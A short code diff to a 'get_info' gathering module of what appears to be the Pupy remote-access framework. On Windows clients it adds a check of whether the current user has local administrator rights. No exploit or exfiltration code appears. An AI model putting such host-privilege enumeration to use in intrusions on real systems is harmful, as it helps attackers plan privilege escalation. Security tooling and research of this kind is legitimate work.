@@ -6,6 +6,7 @@ __class_name__="GetInfo"
 @config(cat="gather")
 class GetInfo(PupyModule):
     """ get some informations about one or multiple clients """
+    dependencies=["psutil", "pupwinutils.security"]
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog='get_info', description=self.__doc__)
         #self.arg_parser.add_argument('arguments', nargs='+', metavar='<command>')
@@ -21,6 +22,14 @@ class GetInfo(PupyModule):
         if self.client.is_windows():
             for k in windKeys:
                 infos+="{:<10}: {}\n".format(k,self.client.desc[k])
+            currentUserIsLocalAdmin = self.client.conn.modules["pupwinutils.security"].can_get_admin_access()
+            desc = "local_adm"
+            if currentUserIsLocalAdmin == True:
+                infos+="{:<10}: {}\n".format(desc,"Yes")
+            elif currentUserIsLocalAdmin == False:
+                infos+="{:<10}: {}\n".format(desc,"No")
+            else:
+                infos+="{:<10}: {}\n".format(desc,"?")
         elif self.client.is_linux():
             for k in linuxKeys:
                 infos+="{:<10}: {}\n".format(k,self.client.desc[k])
